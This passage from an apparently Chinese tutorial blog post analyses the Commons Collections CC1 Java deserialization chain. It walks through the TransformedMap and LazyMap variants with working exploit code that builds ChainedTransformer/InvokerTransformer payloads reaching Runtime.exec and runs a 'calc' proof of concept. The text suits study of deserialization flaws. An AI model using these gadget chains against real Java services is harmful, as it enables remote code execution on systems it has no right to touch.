function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到这个类中的memberValues是可控的，这样我们就看传入自己需要的，然后实现setValue方法。根据前面的entry.setValue，那么这里的memberValue就要相当于entry，memberValues就相当于是transformedmap。</p><p>但是这里有个问题，就是我们可以看到定义这个类的时候，并没有public之类的声明，那么说明这个类只能在本包下被调用(sun.reflect.annotation)，我们想要在外部调用，就需要进行反射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">    InvokerTransformer invokertransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    <span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line">    HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;meteorkai&quot;</span>,<span class="string">&quot;meteorkai&quot;</span>);</span><br><span class="line">    Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokertransformer);</span><br><span class="line">    <span class="comment">/*for(Map.Entry entry:transformedmap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">            entry.setValue(r);</span></span><br><span class="line"><span class="comment">      &#125;*/</span></span><br><span class="line">    <span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line">    Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);<span class="comment">//获取构造器</span></span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);<span class="comment">//修改作用域</span></span><br><span class="line">    Object o=constructor.newInstance(Override.class,transformedmap);<span class="comment">//这里第一个是参数是注解的类原型，第二个就是我们之前的类</span></span><br><span class="line">    serialize(o);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">    ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，当我们满怀期待执行这串代码时，并没有弹出计算器！其实这段代码还是存在很多缺陷的。我们往下分析</p><h2 id="弥补链子缺陷"><a href="#弥补链子缺陷" class="headerlink" title="弥补链子缺陷"></a>弥补链子缺陷</h2><h3 id="一、Runtime类不能序列化"><a href="#一、Runtime类不能序列化" class="headerlink" title="一、Runtime类不能序列化"></a><strong>一、Runtime类不能序列化</strong></h3><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106094958514.png" class="" title="This is an example image"><p>我们跟进Runtime类可以发现他并没有继承serializable接口，不能进行序列化。</p><p>此时我们可以通过反射来获取Runtime类的原型类，它的原型类class是存在serializable接口的，<code>Runtime.class</code> 是可以序列化的。</p><p>那么我们如何获得一个实例化对象呢？可以看到这里存在一个静态的getRuntime()方法，会返回一个Runtime对象，相当于是一种单例模式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//获取类原型</span></span><br><span class="line">Method getRuntime=rr.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);<span class="comment">//获取getRuntime方法</span></span><br><span class="line">Runtime r=(Runtime)getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);<span class="comment">//获取实例化对象，因为该方法为无参方法，所以全为null</span></span><br><span class="line">Method exec=rr.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class);<span class="comment">//获取exec方法</span></span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);<span class="comment">//执行命令</span></span><br></pre></td></tr></table></figure><p>上述这样就可以实现序列化，那么接下来我们用transform来实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.*forName*(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Method getRuntime= rr.getDeclaredMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line"><span class="comment">Runtime r=(Runtime) getRuntime.invoke(null,null);</span></span><br><span class="line"><span class="comment">Method exec=rr.getDeclaredMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">exec.invoke(r,&quot;calc&quot;);*/</span></span><br><span class="line"><span class="comment">//利用transform方法实现上述代码</span></span><br><span class="line">Method getRuntime=(Method)<span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);<span class="comment">//这里模拟获取getRuntime方法，它的具体操作步骤类似之前</span></span><br><span class="line"></span><br><span class="line">Runtime r=(Runtime)<span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntime);<span class="comment">//这里模拟获取invoke方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);<span class="comment">//这里模拟获取exec方法，并进行命令执行</span></span><br></pre></td></tr></table></figure><p>但是这样要一个个嵌套创建参数太麻烦了，我们这里找到了一个Commons Collections库中存在的ChainedTransformer类，它也存在transform方法可以帮我们遍历InvokerTransformer，并且调用transform方法</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106103853342.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.*forName*(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//创建一个Transformer数值用于储存InvokerTransformer的数据，便于遍历</span></span><br><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//调用含参构造器传入Transformer数组，然后调用transform方法，这里对象只需要传一个原始的Runtime就行，因为其他都是嵌套的。</span></span><br><span class="line">ChainedTransformer chainedtransformer=<span class="keyword">new</span> <span class="title class_">Chainedtransformer</span>(transformers);</span><br><span class="line">chainedtransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>第一个问题-Runtime类不能序列化-成功解决，但依然没有弹出计算器。</p><p>不只一个问题。</p><h3 id="二、绕过AnnotationInvocationHandler类readObject方法中的判断条件"><a href="#二、绕过AnnotationInvocationHandler类readObject方法中的判断条件" class="headerlink" title="二、绕过AnnotationInvocationHandler类readObject方法中的判断条件"></a><strong>二、绕过AnnotationInvocationHandler类readObject方法中的判断条件</strong></h3><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106104748114.png" class="" title="This is an example image"><p>这里存在两处判断需要绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (memberType != null) &#123;</span><br><span class="line">if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123;</span><br></pre></td></tr></table></figure><p>首先看第一个判断语句，是对memberType进行判断的。跟踪memberType，是从memberTypes来的，memberTypesu又是从annotationType.memberTypes();来的，而annotationType又是从annotationType &#x3D; AnnotationType.getInstance(type);来的。</p><p>那么其实就是从type来的。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106124951805.png" class="" title="This is an example image"><p>type其实是从构造器传参来的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再回头看我们对构造器的传参，发现type对应Override.class，这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解是没有成员变量的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object o=constructor.newInstance(Override.class,transformedmap);</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106125501951.png" class="" title="This is an example image"><p>而我们发现另一个注解:Target中有个名为value的成员变量，所以我们就可以使用这个注解,并改第一个键值对的值为value即可通过两个判断。</p><p>但是依然不能弹计算器。</p><h3 id="三、checkSetValue传入值不是Runtime-class"><a href="#三、checkSetValue传入值不是Runtime-class" class="headerlink" title="三、checkSetValue传入值不是Runtime.class"></a><strong>三、checkSetValue传入值不是Runtime.class</strong></h3><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106130111612.png" class="" title="This is an example image"><p>我们可以发现readObject方法中setValue传入的参数并不是Runtime.class，而是一个奇奇怪怪的东西。</p><ul><li>我们这里找到了一个能够解决 <code>setValue</code> 可控参数的类 ———— <code>ConstantTransformer</code>。</li></ul><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106154143060.png" class="" title="This is an example image"><p>我们看到这个类里面也有transform，和构造器配合使用的话，我们传入什么值，就会返回某个值，这样就能将value的值转为<strong>Runtime.class</strong></p><p>因此接下来给出我们的最终EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//创建一个Transformer数值用于储存InvokerTransformer的数据，便于遍历</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//这里解决问题三</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedtransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//上述利用反射获取类原型+transformer数组＋chainedtransformer遍历实现transform方法，来解决问题一中的无法序列化问题。</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);<span class="comment">//这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedtransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Target.class,transformedmap);<span class="comment">//这里是问题二中第一个参数改注解为Target</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106164613205.png" class="" title="This is an example image"><p>成功弹出计算器。</p><p>接下来叙述一下整条cc1链的流程</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106170506128.png" class="" title="This is an example image"><h1 id="正版CC1链分析-lazyMap"><a href="#正版CC1链分析-lazyMap" class="headerlink" title="正版CC1链分析-lazyMap"></a>正版CC1链分析-lazyMap</h1><h2 id="终点-利用点-exec方法"><a href="#终点-利用点-exec方法" class="headerlink" title="终点-利用点-exec方法"></a>终点-利用点-exec方法</h2><p>漏洞点与上面一样，还是InvokerTransformer</p><p>在InvokerTransformer#transform下寻找用法</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110195928983.png" class="" title="This is an example image"><p>LazyMap的get方法调用了transform方法且get方法的作用域为public</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200016287.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">factory.transform</span><br></pre></td></tr></table></figure><p>那么我们看看factory是什么</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200355043.png" class="" title="This is an example image"><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200409626.png" class="" title="This is an example image"><p>可以知道factory是LazyMap构造器的参数，同时我们可以通过decorate来new一个LazyMap对象，factory是可以由我们自己决定的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1_lazymap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime runtime=Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map decoratemap=LazyMap.decorate(hashmap,invokerTransformer);</span><br><span class="line">        Class&lt;LazyMap&gt; lazymapclass=LazyMap.class;</span><br><span class="line">        Method lazygetmethod=lazymapclass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>,Object.class);</span><br><span class="line">        lazygetmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        lazygetmethod.invoke(decoratemap,runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110205053416.png" class="" title="This is an example image"><ul><li>目前证明这条链是可行的，我们继续往上走，最终目标是找到入口类的 <code>readObject</code> 方法。</li></ul><p>然后我们的目标就是找谁调用了get方法</p><p>最终在 <code>AnnotationInvocationHandler.invoke()</code> 方法中找到了有一个地方调用了 <code>get()</code> 方法。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110205729222.png" class="" title="This is an example image"><p>这里其实可以类比成让memberValues为LazyMap即可。</p><p>同时这个类也非常好，它里面有 <code>readObject()</code> 方法，可以作为我们的入口类。</p><p>那么接下来我们要关注的就是如何触发invoke()方法</p><p>需要触发 <code>invoke</code> 方法，马上想到动态代理，一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 <code>invoke()</code> 方法。我们去找一找能利用的地方</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110210202367.png" class="" title="This is an example image"><p>在这里调用了 <code>entrySet()</code> 方法，也就是说，如果我们将 <code>memberValues</code> 的值改为代理对象，当调用代理对象的方法，那么就会跳到执行 <code>invoke()</code> 方法，最终完成整条链子的调用。membervalues是构造器需要传入的参数。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110210307500.png" class="" title="This is an example image"><p>那么这里就是要先让membervalues为lazymap再设置动态代理。</p><p>exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lazymap_zong</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span 